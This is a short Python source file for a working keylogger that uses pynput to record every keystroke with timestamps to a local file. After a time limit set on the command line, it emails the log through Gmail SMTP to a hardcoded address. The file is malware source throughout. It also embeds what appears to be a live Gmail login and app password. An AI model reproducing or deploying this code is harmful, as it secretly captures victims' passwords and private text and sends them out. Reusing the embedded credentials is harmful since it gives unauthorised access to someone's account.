import sys
import datetime
import time
from pynput import keyboard
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Global variable to track start time
start_time = None


# Function to handle keypress
def keyPress(key):
    global start_time

    # Check if 10 seconds have passed since start
    if time.time() - start_time >= float(sys.argv[1]):
        send_email()
        with open("keylog.txt", "w") as file:
            pass
        return False  # Stop listener

    # Log keystrokes
    writeKeyToFile(key)


# Function to write keystrokes to a file
def writeKeyToFile(key):
    time_now = datetime.datetime.now()
    with open("keylog.txt", 'a') as keyLog:
        try:
            char = key.char
            keyLog.write(f'{time_now}: {char}\n')
        except AttributeError:
            keyLog.write(f'{time_now}: {key}\n')


# Function to send email with the contents of the keylog
def send_email():
    me = "smspaner@gmail.com"  # Update with your email address
    you = "vpq5kd@virginia.edu"  # Update with recipient's email address

    # Read the contents of the "keylog.txt" file
    with open('keylog.txt', 'r') as fp:
        file_contents = fp.read()

    # Create a multipart message
    msg = MIMEMultipart()
    msg['Subject'] = "Keylogger Report"
    msg['From'] = me
    msg['To'] = you

    # Attach the file contents as plain text
    msg.attach(MIMEText(file_contents, 'plain'))

    # Send the message via SMTP server
    smtp_server = "smtp.gmail.com"  # Update with your SMTP server
    smtp_port = 587  # Update with your SMTP port

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Enable TLS encryption
            # Login to the SMTP server
            server.login("smspaner", "nxci fxzp qlkt qvxc")  # Update with your email password
            # Send the email
            server.sendmail(me, you, msg.as_string())
    except smtplib.SMTPException as e:
        print(f"Failed to send email: {e}")


# Function to start the keylogger
def startKeylogger():
    global start_time
    start_time = time.time()  # Record start time
    listener = keyboard.Listener(on_press=keyPress)
    listener.start()
    listener.join()  # Wait for the listener to finish


# Main function
def main():
    startKeylogger()

if __name__ == "__main__":
    main()
